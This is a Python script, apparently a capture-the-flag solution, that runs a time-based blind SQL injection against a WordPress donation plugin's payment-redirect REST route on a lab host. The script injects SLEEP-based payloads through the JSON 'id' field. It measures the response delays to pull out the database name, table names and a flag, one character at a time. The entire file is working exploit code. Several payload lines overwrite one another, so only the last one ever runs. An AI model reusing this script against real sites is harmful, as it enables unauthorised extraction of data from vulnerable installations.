import requests
import time

def time_delay(url, payload,headers):
    start_time = time.time()
    response = requests.get(url, data=payload,headers=headers)
    end_time = time.time()
    delay = end_time - start_time
    return delay

def time_based_blind_sql_injection(url,headers):
    result = []
    for i in range(6, 100):
        for j in range(32, 126):  # r'0123456789abcdefghijklmnopqrstuvwxyz_-{}':
            # find db ctfJ
            payload = '{"id": "(SELECT 1 FROM (SELECT(SLEEP( (if(ascii(substr(database(),'+str(i)+',1))='+str(j)+',sleep(2),1)))))me)", "formid": "1", "type": "online_payment"}'
            # find table
            payload = '{"id": "(SELECT 1 FROM (SELECT(SLEEP( (if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),' + str(i) + ',1))=' + str(102) + ',sleep(2),1)))))me)", "formid": "1", "type": "online_payment"}'
            payload = '{"id": "(SELECT 1 FROM (SELECT(SLEEP( (if(ascii(substr((select flag from flag limit 0,1),' + str(i) + ',1))=' + str(j) + ',sleep(2),1)))))me)", "formid": "1", "type": "online_payment"}'

            delay = time_delay(url, payload,headers)
            print('{ ', ''.join(result), ' } ->', i, '-', j, "time_delay:", delay)
            if delay > 2:
                result.append(chr(j))
                print(''.join(result))
                break
    else:
        print("The payload is not vulnerable to SQL injection.")
    print('result:', ''.join(result))

if __name__ == "__main__":
    url = "http://eci-2zeicthp0dcakgih57hq.cloudeci1.ichunqiu.com/index.php?rest_route=/xs-donate-form/payment-redirect/3"
    headers = {'Content-Type': 'application/json'}
    time_based_blind_sql_injection(url,headers)
